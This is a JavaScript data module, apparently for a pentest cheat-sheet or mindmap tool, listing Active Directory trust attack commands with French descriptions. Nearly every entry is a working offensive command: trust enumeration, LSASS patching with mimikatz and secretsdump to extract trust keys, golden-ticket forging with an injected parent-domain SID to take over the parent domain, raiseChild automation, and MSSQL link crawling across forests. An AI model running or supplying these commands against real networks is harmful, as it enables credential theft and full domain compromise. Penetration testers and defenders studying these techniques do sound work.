export const TRUSTS_DATA = [
  {
    name: 'Trust Enumeration',
    nodes: [
      { 
        label: 'NLTest Trusted Domains', 
        cmd: 'nltest.exe /trusted_domains', 
        leadsTo: 'Trusted Domains',
        description: 'Utilitaire Windows natif pour lister les domaines ayant une relation de confiance avec le domaine actuel.'
      },
      { 
        label: 'PowerShell Trust Enum', 
        cmd: '[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()', 
        leadsTo: 'Trust Relationships',
        description: 'Utilise les classes .NET pour lister toutes les relations de confiance (Direction, Type, Transitivité).'
      },
      { 
        label: 'Get-DomainTrust (PowerView)', 
        cmd: 'Get-DomainTrust -Domain <domain>', 
        leadsTo: 'Trust Info',
        description: 'Récupère les détails des trusts via PowerView, incluant les attributs comme "WithinForest" ou "ForestTransitive".'
      },
      { 
        label: 'SharpHound Trust Collection', 
        cmd: 'SharpHound.exe --collect trusts --domain <domain>', 
        leadsTo: 'BloodHound Map',
        description: 'Collecte les données de confiance pour les visualiser graphiquement dans BloodHound.'
      }
    ]
  },
  {
    name: 'Trust Keys & SIDs',
    nodes: [
      { 
        label: 'Mimikatz Trust Patch', 
        cmd: 'mimikatz "lsadump::trust /patch" exit', 
        leadsTo: 'Trust Key (Inter-realm)',
        description: 'Patche la mémoire LSASS pour extraire les mots de passe et clés AES des relations de confiance.'
      },
      { 
        label: 'Secretsdump Trust (DRSUAPI)', 
        cmd: 'secretsdump.py -just-dc-user <parent_domain>\\<trust_account$> <domain>/<user>:<password>@<dc_ip>', 
        leadsTo: 'Trust Key',
        description: 'Extrait la clé de confiance via le protocole de réplication DRSUAPI en ciblant le compte de confiance (ex: CHILD$).'
      },
      { 
        label: 'Get-DomainSID', 
        cmd: 'Get-DomainSID -Domain <target_domain>', 
        leadsTo: 'Domain SID',
        description: 'Récupère le SID du domaine distant, indispensable pour forger des tickets inter-domaines.'
      }
    ]
  },
  {
    name: 'Inter-Domain Escalation (Golden Ticket)',
    nodes: [
      { 
        label: 'Golden Ticket (Child to Parent)', 
        cmd: 'mimikatz "kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_sid> /aes256:<trust_key> /sids:<parent_sid>-519 /ptt" exit', 
        leadsTo: 'Parent Domain Admin',
        description: 'Exploite une relation de confiance au sein d\'une forêt en injectant le SID de l\'administrateur du domaine parent dans l\'historique des SID (SID History).'
      },
      { 
        label: 'RaiseChild (Automated)', 
        cmd: 'python3 raiseChild.py -target-sid <parent_sid> <child_domain>/<user>:<password>', 
        leadsTo: 'Parent Domain Admin',
        description: 'Script automatisant la chaîne complète : extraction de clé, forge de ticket inter-domaine et authentification sur le parent.'
      }
    ]
  },
  {
    name: 'Foreign Groups & Users (BloodHound)',
    nodes: [
      { 
        label: 'Find Foreign Admins', 
        cmd: 'MATCH p=(u:User)-[:MemberOf*1..]->(g:Group) WHERE u.domain <> g.domain RETURN p', 
        leadsTo: 'Cross-Domain Path',
        description: 'Requête BloodHound pour identifier les utilisateurs d\'un domaine qui sont membres de groupes dans un autre domaine.'
      }
    ]
  },
  {
    name: 'External Trusts & MSSQL Links',
    nodes: [
      { 
        label: 'MSSQL Link Crawling', 
        cmd: 'Get-SQLServerLinkCrawl -Username <user> -Password <pass>', 
        leadsTo: 'Remote SQL Admin',
        description: 'Parcourt les liens de confiance entre serveurs SQL pour rebondir d\'une forêt à une autre si les liens sont mal configurés.'
      },
      { 
        label: 'MssqlClient (Cross-Forest)', 
        cmd: 'mssqlclient.py <domain>/<user>:<password>@<remote_ip> -windows-auth', 
        leadsTo: 'SQL Shell',
        description: 'Tente une connexion SQL via authentification Windows à travers un trust externe.'
      }
    ]
  }
];